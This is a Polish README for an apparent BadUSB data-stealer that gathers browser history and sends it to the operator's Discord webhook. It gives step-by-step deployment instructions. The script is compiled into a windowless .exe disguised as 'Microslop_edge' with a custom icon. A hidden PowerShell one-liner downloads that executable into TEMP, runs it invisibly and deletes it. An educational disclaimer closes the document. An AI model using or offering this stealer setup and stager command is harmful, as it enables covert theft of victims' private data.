# 🛠️ BadUSB Python Script

Skrypt Python działający jako BadUSB / Data Stealer, który automatycznie zbiera określone dane i przesyła je na Twój serwer Discord za pomocą mechanizmu Webhook. Projekt zawiera kompletny poradnik konfiguracji, instrukcje kompilacji do samodzielnego pliku `.exe` oraz polecenia do szybkiego uruchomienia.

> [!IMPORTANT]
> **Status projektu:** Wersja 1.0 (Pierwsza wersja projektu / MVP).  
> Projekt jest w początkowej fazie rozwoju. Jeśli masz pytania, sugestie lub potrzebujesz dodatkowych informacji o strukturze kodu – **dopytaj autora** w sekcji *Issues* lub bezpośrednio w wiadomości prywatnej.

---

## 🚀 Wymagania wstępne

Zanim przejdziesz do konfiguracji, upewnij się, że na Twoim komputerze zainstalowany jest:
* **Python 3.x** ([Pobierz tutaj](https://python.org))

Do poprawnego działania i budowania projektu wymagane są również zewnętrzne biblioteki (`requests` oraz `pyinstaller`), których instrukcję instalacji znajdziesz poniżej.

---

## 🛠️ Instrukcja konfiguracji i uruchomienia

### Krok 1: Instalacja wymaganych bibliotek
Przed uruchomieniem lub kompilacją skryptu musisz zainstalować bibliotekę do obsługi żądań HTTP (`requests`) oraz narzędzie do budowania plików wykonywalnych (`pyinstaller`). Wykonaj w terminalu poniższe polecenie:

```bash
pip install requests pyinstaller
```

### Krok 2: Konfiguracja Webhooka Discord
1. Otwórz plik z kodem źródłowym (np. `get_browser_history_data.py`) w dowolnym edytorze tekstu lub IDE.
2. Znajdź zmienną odpowiedzialną za adres URL (najczęściej oznaczoną jako `WEBHOOK_URL`).
3. Wklej tam swój spersonalizowany link do webhooka wygenerowany w ustawieniach kanału na Discordzie.

### Krok 3: Kompilacja do pliku `.exe`
Aby skompilować skrypt do jednego, niezależnego pliku wykonywalnego `.exe` (który ukrywa czarne okno konsoli podczas działania), użyj poniższego polecenia:

```bash
pyinstaller --onefile --windowed --name="Microslop_edge" --icon="icon.ico" get_browser_history_data.py
```

*Po zakończeniu procesu gotowy plik `.exe` znajdziesz w nowo utworzonym katalogu `dist/`.*

### Krok 4: Testowe uruchomienie w PowerShell
Aby przetestować działanie skompilowanej aplikacji bezpośrednio z poziomu konsoli PowerShell, przejdź do folderu `dist` i wykonaj poniższy skrypt:

```powershell
powershell -WindowStyle Hidden -Command "\$url = 'TUTAJ_WKLEJ_LINK'; out = 'env:TEMP\plik.exe'; Invoke-WebRequest -Uri url -OutFile out; Start-Process out -WindowStyle Hidden -CreateNoWindow -Wait; Remove-Item out -Force"
```

---

## ⚠️ Zastrzeżenie (Disclaimer)

Projekt został stworzony wyłącznie w celach edukacyjnych, pokazowych oraz do testów penetracyjnych w kontrolowanych środowiskach (za uprzednią i wyraźną zgodą właściciela infrastruktury). 

Autor **nie ponosi odpowiedzialności** za jakiekolwiek szkody, naruszenia prywatności, utratę danych lub straty wizerunkowe spowodowane niewłaściwym, złośliwym lub niezgodnym z prawem użyciem tego oprogramowania. Korzystasz z kodu na własną odpowiedzialność.
